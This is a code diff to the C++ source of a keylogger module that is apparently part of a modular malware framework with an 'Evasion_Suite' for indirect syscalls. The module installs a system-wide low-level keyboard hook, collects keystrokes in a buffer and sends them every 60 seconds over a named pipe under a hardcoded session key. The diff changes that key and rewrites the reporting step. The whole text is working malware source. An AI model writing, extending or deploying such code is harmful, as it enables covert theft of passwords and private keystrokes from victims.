@@ -9,6 +9,7 @@
 #include "Atom_02_Key.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
+#include <cstring>
 
 /* The ring buffer for keystrokes */
 static char  s_KeyBuffer[KEYLOG_BUFFER_SIZE] = { 0 };
@@ -123,7 +124,7 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
     
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
 
     /* Set the system-wide hook. Requires user32.dll */
     s_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
@@ -137,9 +138,16 @@ DWORD WINAPI KeyloggerAtomMain(LPVOID lpParam) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
         
-        /* Flush every 60 seconds */
+        /* Flush every 60 seconds with standard IPC reporting */
         if (GetTickCount() - dwLastFlush > 60000) {
-            FlushKeyBufferToIPC(hPipe, SharedSessionKey);
+            if (s_dwBufferIndex > 0) {
+                IPC_MESSAGE reportMsg = { 0 };
+                reportMsg.CommandId = CMD_REPORT;
+                reportMsg.dwPayloadLen = s_dwBufferIndex;
+                memcpy(reportMsg.Payload, s_KeyBuffer, s_dwBufferIndex);
+                IPC_SendMessage(hPipe, &reportMsg, SharedSessionKey, 16);
+                s_dwBufferIndex = 0;
+            }
             dwLastFlush = GetTickCount();
         }
     }
